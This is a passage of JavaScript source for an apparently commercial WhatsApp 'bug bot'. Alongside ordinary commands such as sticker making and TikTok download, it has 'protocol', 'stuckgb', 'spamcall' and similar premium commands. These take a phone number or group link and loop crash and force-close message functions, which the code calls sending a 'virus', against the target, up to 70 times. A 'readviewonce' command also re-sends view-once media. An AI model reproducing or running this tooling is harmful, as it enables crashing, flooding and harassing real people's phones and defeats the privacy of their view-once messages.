    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363422040633302@newsletter",
      serverMessageId: null,
      newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "Sellect Type-Bugs",
      sections: [
        {
          title: "⌜ 𝐗𝐙𝐀𝐏 ⌟",
          highlight_label: "𝐊͢𝐲͡𝐧𝐚͜𝐗͢",
          rows: [
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 1",
              description: "",
              id: `.protocol1 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 2",
              description: "",
              id: `.protocol2 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 3",
              description: "",
              id: `.protocol3 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 5",
              description: "",
              id: `.protocol5 ${target}` 
            },
            {
            header: "",
              title: "ᴘʀᴏᴛᴏ 6",
              description: "",
              id: `.protocol6 ${target}`,
              header: "",
              title: "ᴘʀᴏᴛᴏᴄᴏʟ v1",
              description: "",
              id: `.protocol ${target}`   
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏᴄᴏʟ v2",
              description: "",
              id: `.protoxzen ${target}`                                      
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol2 });
}
break
		
case 'spammenu':
case 'menuspam':
case 'spam-menu': {
if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
    mentionedJid = m.mentionedJid[0]; // ambil yang pertama ditag
} else {
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
    mentionedJid = `${jidx}@s.whatsapp.net`;
}

let target = mentionedJid;
    
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomBugs },
  caption: `*— ( 🐉 ) ⾷ Olaa... ${info}*
> My Owner and My Developer ( Tn. YifanModss ) 👑

\`クラッシャーフォーエックス\`
*—=# Attack : ${target} #=—*
*Sellect This Type spam 🗿🔥*`,
  footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 200,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363422040633302@newsletter",
      serverMessageId: null,
      newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "Sellect Type-Bugs",
      sections: [
        {
          title: "⌜ 𝐗𝐙𝐀𝐏 ⌟",
          highlight_label: "𝐊͢𝐲͡𝐧𝐚͜𝐗͢",
          rows: [
            {                        
              header: "",
              title: "𝐒𝐩𝐚𝐦𝐏𝐚𝐢𝐫",
              description: "",
              id: `.spam-pair ${target}|1000`
            },
            {
              header: "",
              title: "𝐒𝐩𝐚𝐦𝐂𝐚𝐥𝐥",
              description: "",
              id: `.spamcall ${target}`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol2 });
}
break;

case 'stuckgb': {
  if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
  if (!q) return kontolreply(example("https://chat.whatsapp.com/"));

  try {
    await sleep(1000);
    xreplybugbutton(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await sock.groupAcceptInvite(result);

    for (let i = 0; i < 1; i++) {
      await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
    }
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number or link is valid.");
  }
}
// Helper function to get the phone number
async function getPhoneNumber() {
  if (m.mentionedJid?.length > 0) {
    return m.mentionedJid[0];
  } else {
    let raw = qtext.split("|")[0].replace(/[^0-9]/g, '');
    if (raw.startsWith("0")) return kontolreply(`Gunakan format internasional: 628xxx`);
    return `${raw}@s.whatsapp.net`;
  }
}

// Add Owner / Premium Handler
async function addOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let isValid = await sock.onWhatsApp(numero);
  if (isValid.length === 0) return kontolreply(example("628xxx or tag @user"))

  if (commandType === 'addowner' || commandType === 'addown') {
    if (!owner.includes(numero)) owner.push(numero);
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan sebagai Owner & Premium!`);
  } else if (commandType === 'addpremium' || commandType === 'addprem') {
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan ke Premium!`);
  }
}

// Delete Owner / Premium Handler
async function deleteOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let indexOwner = owner.indexOf(numero);
  let indexPremium = Premium.indexOf(numero);

  if (indexOwner === -1 && indexPremium === -1) {
    return kontolreply(`Nomor ${numero.split('@')[0]} tidak ditemukan dalam database.`);
  }

  if (commandType === 'delowner' || commandType === 'delown') {
    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari database!`);
  } else if (commandType === 'delpremium' || commandType === 'delprem') {
    if (indexPremium !== -1) {
      Premium.splice(indexPremium, 1);
      fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
      xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari Premium!`);
    } else {
      kontolreply(`Nomor ${numero.split('@')[0]} tidak ada dalam database Premium.`);
    }
  }
}

break
  case 'addowner':
  case 'addown':
    await addOwnerOrPremium('addowner');
    break;

  case 'delowner':
  case 'delown':
    await deleteOwnerOrPremium('delowner');
    break;

  case 'addpremium':
  case 'addprem':
    await addOwnerOrPremium('addpremium');
    break;

  case 'delpremium':
  case 'delprem':
    await deleteOwnerOrPremium('delpremium');
  break;
  
case 'qc': {
  if (!q) return kontolreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
case "play": {
        if (!qtext) return kontolreply(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return kontolreply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return kontolreply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return kontolreply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return kontolreply("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await xreplyWithButton("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await xreplyWithButton("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  xreplyWithButton("Success Delete Profile Picture");
}
break;
case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return kontolreply(`Reply media with caption ${prefix + command}`);
  if (!quoted) return kontolreply(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;
case 'tagall':
case 'ht': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'kynax lonely Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;
case 'kick': {
if (!DevOnly) return
  if (!m.isGroup) return kontolreply('💬 Only GC')
  if (!BotAdm) return kontolreply('👤 Bot not yet admin')
  if (!Adm) return kontolreply('🗣️ Only for admin')

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return kontolreply(" 628xxx / @tag ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;

case "swgrup": case "swgc": {
 try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                // ambil teks sesuai aturan: hapus perintah, sisakan isi teks saja
                const caption = m.body.replace(/^\.(swgrup|swgc)\s*/i, "").trim();
                const jid = m.chat;
                
                // === TAMBAHAN: AMBIL SEMUA GRUP BOT & TOMBOL PILIHAN ===
                const allGroups = await sock.groupFetchAllParticipating();
                const listGroup = Object.values(allGroups).map(g => ({ nama: g.subject, id: g.id }));

                const pilihGrup = caption.match(/^grupid:([\d\-\w]+@g\.us)\s*/i);
                let isiTeks = caption;
                let grupTujuan;

                if (!pilihGrup) {
                    const buttons = listGroup.map(g => ({
                        buttonId: `.swgc grupid:${g.id} `,
                        buttonText: { displayText: g.nama.length > 20 ? g.nama.substring(0,17)+'...' : g.nama },
                        type: 1
                    }));

                    await sock.sendMessage(jid, {
                        text: `📋 DAFTAR GRUP\nPilih grup tempat status akan ditampilkan:`,
                        buttons: buttons,
                        headerType: 1
                    });
                    return;
                }

                grupTujuan = pilihGrup[1];
                isiTeks = caption.replace(/^grupid:[\d\-\w]+@g\.us\s*/i, "").trim();

                const cekAda = listGroup.find(g => g.id === grupTujuan);
                if (!cekAda) return xreplyWithButton("❌ Grup tidak ditemukan atau bot tidak ada di grup tersebut!");

                // txt
                if (!mime && isiTeks) {
                    await sock.sendMessage(grupTujuan, {
                        groupStatusMessage: {
                            text: isiTeks
                        }
                    });
                    return xreplyWithButton(`✅ Sukses tambah status teks ke grup:\n${cekAda.nama}`);
                }

                // phto
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(grupTujuan, {
                        groupStatusMessage: {
                            image: buffer,
                            caption: isiTeks
                        }
                    });
                    return xreplyWithButton(`✅ Sukses tambah status foto ke grup:\n${cekAda.nama}`);
                }

                // vd
                if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(grupTujuan, {
                        groupStatusMessage: {
                            video: buffer,
                            caption: isiTeks
                        }
                    });
                    return xreplyWithButton(`✅ Sukses tambah status video ke grup:\n${cekAda.nama}`);
                }

                // aud
                if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(grupTujuan, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    return xreplyWithButton(`✅ Sukses tambah status audio ke grup:\n${cekAda.nama}`);
                }

                // ruls
                await xreplyWithButton(`⚠️ Cara pakai:
• Teks: .swgc tulis teks disini
• Foto: .swgc (balas foto) tulis teks disini (boleh kosong)
• Video: .swgc (balas video) tulis teks disini (boleh kosong)
• Audio: .swgc (balas audio)`);

               } catch (e) { replykontol('*🕊️ Error*\n' + e) }
            }
            break;
            
case 'linkgroup': case 'linkgc': case 'lgb': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;
case 'resetlinkgc':
case 'rgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
  xreplyWithButton('*✅ done*')
}
break;
case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  xreplyWithButton(`*Success Change Mode Self To Public*`);
}
break;
case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  xreplyWithButton(`*Success Change Mode Public To Self*`);
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return kontolreply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return kontolreply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return kontolreply('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return kontolreply('Failed to upload media!');
    }

    xreplyWithButton(`✅ *Succes Upload to Link*\n ${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return xreplyWithButton(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return kontolreply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return kontolreply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
case 'brat': {
            if (!q) return xreplyWithButton(`Send command with text. ${prefix + command} Rizxvelz`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break
case 'tes':
case 'status': {
xreplyWithButton(`*Connect*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return xreplyWithButton(`woi, lu siapa?`)
if (!q) return kontolreply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break
//TIKTOK CASE		
case 'tiktok': 
      case'tt':{
        if (!qtext) return xreplyWithButton(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE
case 'meta-ai':
case 'ai':
case 'meta': {
 if (!args.length) {
 return kontolreply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *.ai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return kontolreply("❌ AI tidak dapat memberikan jawaban.");
 }
 kontolreply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 kontolreply("❌ Terjadi kesalahan saat mengakses AI KynaX\n" + error.message);
 }
 break
case 'protocol3': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
      await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol3': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
      await ForcloseNgt(sock, target)
      await buttonnull(target)
      await sendOfferCall(target) 
      await CrashMemek(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol2': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'spamcall': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let r = 0; r < 30; r++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol1': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 40; i++) {
      await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 50; i++) {
      await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol5': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 60; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protoxzen': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 70; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break

case 'xandros-ui':
case 'blank': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
